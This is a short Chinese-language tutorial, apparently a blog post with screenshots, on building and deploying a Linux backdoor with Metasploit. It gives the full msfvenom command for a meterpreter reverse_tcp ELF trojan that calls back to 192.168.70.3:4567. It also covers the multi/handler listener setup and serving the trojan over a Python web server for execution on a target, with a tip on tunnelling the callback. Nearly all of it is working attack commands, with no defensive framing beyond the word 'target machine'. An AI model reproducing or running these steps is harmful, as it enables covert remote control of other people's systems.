# 一、环境准备

1. MSF-Metasploit Framework
2. 一台靶机

# 二、木马生成

1. 生成一个Linux后门

   ```
   msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 -f elf > shell.elf
   ```

   ![1643108165465](https://image.201068.xyz/assets/1643108165465.png)

# 三、配置监控

1. 启动msf   终端内输入：`msfconsole` 启动msf

   ![1643108186343](https://image.201068.xyz/assets/1643108186343.png)

2. 载入监控模块  msf中输入：  `use exploit/multi/handler`

3. 加载payload  msf终端中输入：

   `set payload linux/x64/meterpreter/reverse_tcp`

4. 配置payload  msf终端中输入：`show options`

   ![1643108202630](https://image.201068.xyz/assets/1643108202630.png)

5. 配置payload监控IP msf终端中输入： `set  lhost  192.168.70.3`

6. 配置payload监控端口  msf终端中输入：`set lport  4567` （注意这里要和木马配置时使用的端口相同&如果使用内网穿透服务填写转发后的端口）

7. 检查payload配置  msf终端中输入：`show options`

8. 执行监控  msf终端中输入： `run`

   ![1643108218621](https://image.201068.xyz/assets/1643108218621.png)

# 四、攻击利用

1. 将木马上传到靶机 

   通过python创建一个简单web服务

   `python3 -m http.server 80`

   或

    `python2 -m SimpleHTTPServer 80`

2. 在靶机上**执行**木马 

   

3. 完成攻击利用

   ![1643108263211](https://image.201068.xyz/assets/1643108263211.png)













